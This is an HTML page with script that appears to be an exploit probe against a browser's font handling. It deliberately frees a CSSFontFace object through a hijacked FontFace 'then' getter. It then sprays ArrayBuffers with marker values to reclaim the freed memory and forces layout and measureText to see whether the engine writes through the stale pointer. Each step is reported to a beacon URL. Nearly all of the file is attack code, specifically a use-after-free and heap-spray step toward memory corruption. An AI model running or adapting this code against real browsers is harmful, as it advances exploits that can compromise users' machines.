<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1147v3</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1147v3: CSS LAYOUT CHASE AFTER CSSFONTFACE UAF ===');
log('info','FOCUSED: Does CSS font matcher chase stale CSSFontFace pointer?');
log('info','v2 Test B bug: font name had literal quotes. Fixed.');
B('P1147V3-START','t='+Date.now());

var r=Date.now()%100000;
var spray=[];
var uafHit=false;

// Create @font-face in stylesheet + CSS class that uses it
var st=document.createElement('style');
st.textContent="@font-face{font-family:ff"+r+";src:local(Arial);unicode-range:U+0041-005A}" +
  " .useit"+r+"{font-family:ff"+r+",serif;font-size:48px;display:block;}";
document.head.appendChild(st);

// Also add via JS FontFace API
var ff=new FontFace('ff'+r,'local(Helvetica)',{unicodeRange:'U+0041-005A'});
document.fonts.add(ff);void ff.loaded;

log('info','Font: ff'+r+' (style + JS FontFace)');
B('P1147V3-SETUP','font=ff'+r);

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;uafHit=true;
  log('ok','then getter FIRED');
  B('P1147V3-THEN','fired');

  // ONLY delete from document.fonts — keep the stylesheet!
  // The @font-face rule in CSS still references the CSSFontFace C++ object
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;
  log('ok','Deleted from document.fonts, style KEPT');

  // Reclaim with MARKER pattern
  for(var k=0;k<60;k++){
    var ab=new ArrayBuffer(192);
    var v=new BigUint64Array(ab);
    v[0]=0xDEAD0001n;
    v[1]=0xCAFE0002n;
    v[2]=0xBEEF0003n;
    v[3]=0xFACE0004n;
    spray.push(ab);
  }
  log('ok','Sprayed '+spray.length+' marker bufs (192B)');

  // NOW force CSS layout with elements using the @font-face family!
  // The CSS engine should: match .useit -> @font-face -> CSSFontFace (FREED + RECLAIMED!)
  for(var i=0;i<20;i++){
    var el=document.createElement('div');
    el.className='useit'+r;
    el.textContent='ABCDEFGHIJ TEST LINE '+i;
    document.body.appendChild(el);
  }

  // Force synchronous layout
  var h=document.body.offsetHeight;
  log('ok','Forced layout with 20 divs using freed font, height='+h);
  B('P1147V3-LAYOUT','divs=20|height='+h);

  // Force layout AGAIN with getComputedStyle
  var testEl=document.querySelector('.useit'+r);
  if(testEl){
    var cs=getComputedStyle(testEl);
    var ff2=cs.fontFamily;
    var fs=cs.fontSize;
    log('info','getComputedStyle: fontFamily='+ff2+' fontSize='+fs);
    B('P1147V3-COMPUTED','family='+ff2+'|size='+fs);
  }

  // measureText — another path that touches font data
  try{
    var cv=document.createElement('canvas');
    var ctx=cv.getContext('2d');
    ctx.font='48px ff'+r+', serif';
    var m=ctx.measureText('ABCDEFGHIJ');
    log('info','measureText width='+m.width);
    B('P1147V3-MEASURE','width='+m.width);
  }catch(e){
    log('fail','measureText err: '+e.message);
  }

  return undefined;
},set:function(){}});

document.fonts.load('1em ff'+r,'ABCDE').then(function(){},function(){});

setTimeout(function(){
  delete FontFace.prototype.then;

  if(!uafHit){
    log('fail','then getter never fired');
    B('P1147V3-RESULT','then=false');
    B('P1147V3-DONE','nohit');
    return;
  }

  // Check if ANY spray buffer was modified by the CSS engine
  var changed=0;
  var details=[];
  for(var k=0;k<spray.length;k++){
    var v=new BigUint64Array(spray[k]);
    var mismatch=false;
    if(v[0]!==0xDEAD0001n||v[1]!==0xCAFE0002n||v[2]!==0xBEEF0003n||v[3]!==0xFACE0004n){
      mismatch=true;
    }
    // Also check if engine wrote to the zero slots (q4-q23)
    for(var q=4;q<24;q++){
      if(v[q]!==0n){mismatch=true;break;}
    }
    if(mismatch){
      changed++;
      if(details.length<8){
        var d=[];
        for(var q=0;q<24;q++) d.push(hex64(v[q]));
        details.push({idx:k,d:d});
      }
    }
  }

  log('ok','Modified spray bufs: '+changed+'/'+spray.length);
  B('P1147V3-RESULT','then=true|changed='+changed);

  if(changed>0){
    log('win','!!! CSS ENGINE WROTE TO RECLAIMED CSSFONTFACE MEMORY !!!');
    log('win','The stale pointer IS chased during layout!');
    for(var i=0;i<details.length;i++){
      var dd=details[i];
      log('ptr','buf['+dd.idx+']:');
      log('ptr','  q0-3: '+dd.d.slice(0,4).join(' '));
      log('ptr','  q4-7: '+dd.d.slice(4,8).join(' '));
      if(i<4) B('P1147V3-MOD-'+i,'idx='+dd.idx+'|q0='+dd.d[0]+'|q1='+dd.d[1]+'|q2='+dd.d[2]+'|q3='+dd.d[3]);
    }
  }else{
    log('info','All markers intact. CSS engine did NOT chase the stale CSSFontFace pointer.');
    log('info','The stylesheet -> CSSFontFace link is either NULL-checked or already severed.');
  }

  // EXTRA: Force a second layout pass to catch lazy evaluation
  log('phase','--- Extra: second layout pass ---');
  for(var i=0;i<10;i++){
    var el2=document.createElement('div');
    el2.className='useit'+r;
    el2.textContent='SECOND PASS LINE '+i;
    document.body.appendChild(el2);
  }
  document.body.offsetHeight;

  var changed2=0;
  for(var k=0;k<spray.length;k++){
    var v=new BigUint64Array(spray[k]);
    if(v[0]!==0xDEAD0001n||v[1]!==0xCAFE0002n||v[2]!==0xBEEF0003n||v[3]!==0xFACE0004n){
      changed2++;
    }
    for(var q=4;q<24;q++){if(v[q]!==0n){changed2++;break;}}
  }

  log('ok','After 2nd layout: changed='+changed2);
  B('P1147V3-PASS2','changed='+changed2);

  // Clean up
  if(st.parentNode) st.remove();
  B('P1147V3-DONE','complete');
  log('phase','=== P1147v3 COMPLETE ===');
},80);
</script></body></html>
